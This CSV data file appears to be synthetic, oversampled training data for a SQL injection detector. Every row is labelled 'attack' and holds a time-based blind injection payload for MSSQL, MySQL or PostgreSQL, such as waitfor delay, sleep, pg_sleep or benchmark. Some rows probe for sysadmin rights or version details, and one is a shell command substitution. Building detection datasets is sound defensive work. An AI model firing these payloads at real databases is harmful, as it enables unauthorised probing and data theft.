id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001633,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.11181423997731438
SMOTE_001634,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.707294961942895
SMOTE_001635,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.3066008792924622
SMOTE_001636,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.20062561518185143
SMOTE_001637,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.07984417066168056
SMOTE_001638,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,1.2331240372148136
SMOTE_001639,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.8256360301909409
SMOTE_001640,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,0.833000052954935
SMOTE_001641,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.7718364844017278
SMOTE_001642,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3747678496972322
SMOTE_001643,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.7384193466241837
SMOTE_001644,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,0.7320890499162607
SMOTE_001645,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.911412559083314
SMOTE_001646,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,1.5378720016948264
SMOTE_001647,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,2.464637129444337
SMOTE_001648,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,0.8107641994373356
SMOTE_001649,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.8949533479288756
SMOTE_001650,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.2789225761416374
SMOTE_001651,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.196438591678271
SMOTE_001652,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.037542402623590064
SMOTE_001653,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.22510114505235732
SMOTE_001654,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.5370371923345323
SMOTE_001655,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,5.624650770345958
SMOTE_001656,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.656003450089885
SMOTE_001657,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,2.174074389855026
SMOTE_001658,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.24083250864581646
SMOTE_001659,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,3.62751626643307
SMOTE_001660,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.6013929770648369
SMOTE_001661,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.006875695171728506
SMOTE_001662,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,3.0087553567005
SMOTE_001663,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.1333352896717703
SMOTE_001664,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.2251988580190534
SMOTE_001665,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,1.1121826648285769
SMOTE_001666,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,3.141465090147757
SMOTE_001667,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.22299642096439487
SMOTE_001668,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,4.576806899673926
SMOTE_001669,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6890164787660897
SMOTE_001670,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.8792731161912021
SMOTE_001671,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,4.4715604848313815
SMOTE_001672,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.512945894426887
SMOTE_001673,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.4001409995372537
SMOTE_001674,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,1.8291672965095356
SMOTE_001675,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,1.6240220467387703
SMOTE_001676,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.6742254180400471
SMOTE_001677,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,2.4420463236344325
SMOTE_001678,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.08148609981096772
SMOTE_001679,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.4798368730998914
SMOTE_001680,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.5524869040028659
SMOTE_001681,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.3233474994072379
SMOTE_001682,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.10435266822898191
SMOTE_001683,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.3352221964977343
SMOTE_001684,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.2785566766572254
SMOTE_001685,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.091372573536552
SMOTE_001686,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,1.6669009216524746
SMOTE_001687,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.1851873545130285
SMOTE_001688,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.217395808656571
SMOTE_001689,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.041424899798574145
SMOTE_001690,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.8681853489082932
SMOTE_001691,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9714316165059954
SMOTE_001692,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.033854659382515
SMOTE_001693,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.5473129568204834
SMOTE_001694,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.5823080275469743
SMOTE_001695,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5351643069703322
SMOTE_001696,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.094844846540133
SMOTE_001697,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.178811793012559
SMOTE_001698,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.6008574729348455
SMOTE_001699,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.029422225472964334
SMOTE_001700,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,2.666436761424991
SMOTE_001701,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.519861803097222
SMOTE_001702,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.8014703126339565
SMOTE_001703,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.3372051317562925
SMOTE_001704,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,1.780225645398966
SMOTE_001705,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.7541689298073251
SMOTE_001706,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.0612726947641238
SMOTE_001707,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,1.7414230536107367
SMOTE_001708,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6882091937407908
SMOTE_001709,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,1.7402346897001761
SMOTE_001710,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.459567104026228
SMOTE_001711,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.4809129409927114
SMOTE_001712,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.10629976560264476
SMOTE_001713,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0003387172275429432
SMOTE_001714,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,2.0803972308534933
SMOTE_001715,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,3.304539005341252
SMOTE_001716,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,1.5391926751304232
SMOTE_001717,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.687806064083549
SMOTE_001718,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,0.7580673903082926
SMOTE_001719,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.36190484669972334
SMOTE_001720,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.02615709059363648
SMOTE_001721,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,3.115892208611713
SMOTE_001722,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,2.1389379203955814
SMOTE_001723,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.07669651036236635
SMOTE_001724,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,3.6726780230788996
SMOTE_001725,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.0229272885059701
SMOTE_001726,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.5121202790763221
SMOTE_001727,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,2.2085673295255344
SMOTE_001728,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.7402564087061902
SMOTE_001729,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,1.3781485292929203
SMOTE_001730,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,0.21488523027814949
SMOTE_001731,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.022077881883315983
SMOTE_001732,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,2.5766661480525195
SMOTE_001733,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.7129552813871143
SMOTE_001734,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.12190343041288379
SMOTE_001735,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.16947263770284754
SMOTE_001736,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7980241986884917
SMOTE_001737,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.2046429976813855
SMOTE_001738,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.1430007621748748
SMOTE_001739,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.17357306150708482
SMOTE_001740,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9074293703832979
SMOTE_001741,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.9947476061072675
SMOTE_001742,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.35142134636122807
SMOTE_001743,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.329192460235774
SMOTE_001744,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,2.1767975250112075
SMOTE_001745,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.94974017844999
SMOTE_001746,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.2709947642450829
SMOTE_001747,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.25963902590807103
SMOTE_001748,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6520790912500276
SMOTE_001749,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.9796562332232983
SMOTE_001750,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,2.771244222320489
SMOTE_001751,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.370363083773698
SMOTE_001752,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.2665397850196569
SMOTE_001753,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13519520226639958
SMOTE_001754,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.08388911530847627
SMOTE_001755,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.8476902679952117
